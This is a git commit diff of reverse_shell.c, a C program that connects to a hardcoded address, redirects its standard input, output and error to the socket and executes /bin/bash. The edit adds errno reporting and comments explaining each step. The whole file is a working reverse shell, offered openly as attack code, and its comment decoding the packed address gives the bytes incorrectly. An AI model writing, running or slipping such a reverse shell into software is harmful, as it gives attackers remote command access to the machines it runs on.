2e0d09564fc8e027d2073edf2e517bc5fb0688d9
VirtualWizard100 <139145827+VirtualWizard100@users.noreply.github.com>
2026-05-27 19:33:34 -0400

    Add files via upload

--- reverse_shell.c
+++ reverse_shell.c
@@ -1,30 +1,39 @@
-#include <stdio.h>
 #include <unistd.h>
+#include <stdio.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
+#include <errno.h>
+#include <string.h>
 
-int main() {
+char *get_errno_message() {
+	char *errno_message = strerror(errno);
+	static char buffer[100];
+	sprintf(buffer, "errno(%d): %s\n", errno, errno_message);
+	return buffer;
+};
+
+int main(int argc, char **argv) {
 	int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 
 	if (s < 0) {
+		fprintf(stderr, "Line %d: %s\n", (__LINE__ - 1), get_errno_message());
 		return 1;
 	};
 
-	struct sockaddr_in addr;
-	addr.sin_family = AF_INET;
-	addr.sin_addr.s_addr = inet_addr("192.168.0.6");
-	addr.sin_port = htons(8080);
-
-	while (connect(s, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
+	unsigned long addr = 0x0100007f11120002;		// IP Address -> 1.0.0.127, port -> 25 46, Internet Family -> 2 (AF_INET) (struct sockaddr_in in Little Endian)
+	char *name[2] = {"/bin/bash", NULL};
+	while (connect(s, (struct sockaddr *)&addr, sizeof(struct sockaddr)) < 0) {
 	};
 
-	dup2(s, 0);
-	dup2(s, 1);
-	dup2(s, 2);
+	dup2(s, 0);	// So that way 0 points to the socket file descriptor in the process container instead of the local keyboard
+	dup2(s, 1);	// So that way 1 points to the socket file descriptor instead of the local terminal window
+	dup2(s, 2);	// So that way 2 points to the socket file descriptor instead of the local terminal window
+	execv(name[0], name);	// Create a bash shell in the process container which replaces this programs process with it, then it's process points to the same stdin, stdout, and stderr that point to the socket file descriptor
 
-	char *shell = "/bin/sh";
+	return 0;		// End this program process, because the shell process has now overwritten this process and is now controlling/owns the process container instead of this program
+	/*
+		stdin from user on peer socket in socket file descriptor is pointed to by stdin, stdin is pointed to by the shell process, the shell process then evaluates the data from stdin,
+		then writes it's output to the stdout file descriptor, which is then redirected to the socket file descriptor, which is then sent across the network to the user peer socket
+	*/
 
-	execve(shell, NULL, NULL);
-
-	return 0;
 };
